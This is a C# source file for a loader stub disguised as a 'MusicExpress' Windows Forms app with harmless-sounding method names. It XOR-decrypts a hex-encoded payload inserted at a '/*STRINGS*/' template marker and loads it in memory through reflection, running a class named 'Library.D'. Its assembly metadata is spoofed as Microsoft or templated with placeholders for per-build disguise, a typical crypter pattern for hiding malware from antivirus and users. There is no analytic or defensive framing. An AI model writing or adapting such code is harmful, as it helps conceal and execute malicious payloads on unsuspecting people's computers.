using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

#if DEBUG
[assembly: AssemblyTitle("Loader")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Microsoft")]
[assembly: AssemblyProduct("Loader")]
[assembly: AssemblyCopyright("Copyright © Microsoft 2017")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("f99b3ca6-3b37-43a6-9332-8604c582fd9b")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
#else
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCTNAME%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("%GUID%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%VERSION%")]
#endif


namespace MusicExpress
{
    
    public class MusicExpressMain : Form
    {

        public MusicExpressMain()
        {
            InitializeComponent();
            init();
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // F1
            // 
            this.ClientSize = new System.Drawing.Size(284, 262);
            this.Name = "Music Express";
            this.ResumeLayout(false);

        }

        private void init()
        {
            object data = GetMusic();

            AppDomain domain = AppDomain.CurrentDomain;

            Assembly a = (Assembly)Browse(data, domain);
            
           object lib = a.CreateInstance("Library.D");



        }

        private object Browse(object data,object domain)
        {
            return typeof(AppDomain).InvokeMember("Load", BindingFlags.Instance | BindingFlags.InvokeMethod | BindingFlags.Public, null, domain, new object[] { data });
            
        }

        private object GetMusic()
        {
            string s = MusicReader.Path;
            return Play(s);
        }

        private object Play(string path)
        {

            byte[] music = new byte[path.Length / 2];
            byte[] key = new byte[16];
            for(int i = 0; i < path.Length; i+=2)
            {
                if(i < 32)
                {
                    key[i / 2] = Convert.ToByte(path.Substring(i, 2), 16);
                }
                else
                {
                    int index = (i / 2) - 16;

                    music[index] = (byte)(Convert.ToByte(path.Substring(i, 2), 16) ^ key[index % key.Length]);
                }
             
            }
            return music;
        }
    }

    static class MusicReader
    {
        public static string Path { get {  return string.Join("", _getPath()); } }

        private static string[] _getPath()
        {
            List<string> strings = new List<string>();

            /*STRINGS*/

           
            return strings.ToArray();
        }
        

        
    }

    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MusicExpressMain());
        }
    }
}
